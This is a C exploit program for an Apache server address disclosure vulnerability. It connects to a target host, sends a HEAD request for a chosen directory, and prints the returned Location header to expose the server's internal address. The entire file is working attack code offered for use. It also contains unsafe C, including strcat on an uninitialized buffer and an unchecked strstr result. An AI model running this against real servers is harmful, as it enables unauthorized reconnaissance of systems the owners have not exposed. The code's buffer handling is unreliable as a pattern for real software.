#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/time.h>
#define ERROR -1
#define MAXLEN 400
main(int argc, char *argv[])
{
int sock_fd;
struct sockaddr_in dest_addr;
struct hostent *he;
char buf[1024];
char request[1024];
char *p;
int i;
int jackmove;
 
if (argc != 4) {
printf("Usage: %s <hostname> <port> <directory>\n",argv[0]);
printf("Example(verbose): %s www.linux.org 80 /info\n",argv[0]);
printf("Example(specify): %s www.linux.org 80 /info | grep Location\n",argv[0]);
printf("Example(output) : Location: http://127.0.0.3/supersecretshit/\n");
exit(1);
}
 
if ((he=gethostbyname(argv[1])) == NULL) { /* get the host info */
printf("Unknown host.\n");
exit(1);
}
 
dest_addr.sin_family = AF_INET;
i = atoi(argv[2]);
dest_addr.sin_port = htons(i);
dest_addr.sin_addr = *((struct in_addr *)he->h_addr);
bzero(&(dest_addr.sin_zero), 8);
 
/* heh, sorry, no error checking */
if((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
printf("Cannot open socket.\n");
exit(1);
}
 
if(connect(sock_fd, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr)) == -1) {
printf("Could not connect to socket.\n");
exit(1);
}
 
printf("Disclose - Exploit for the Apache Server Address Disclosure Vulnerability\n");
strcat(request,"HEAD ");
strcat(request,argv[3]);
strcat(request," HTTP/1.0\n\n\n");
sleep(1);
send(sock_fd, request, strlen(request), 0);
printf("Status: ");
if((jackmove=recv(sock_fd, buf, MAXLEN, 0)) == ERROR) {
    printf("recv error\n");
        close(sock_fd);
    exit(1);
}
 
printf("Done.\n");
buf[jackmove] = '\0';
p=strstr(buf, "Location");
printf("%s\n", p);
 
close(sock_fd);
exit(0);
}
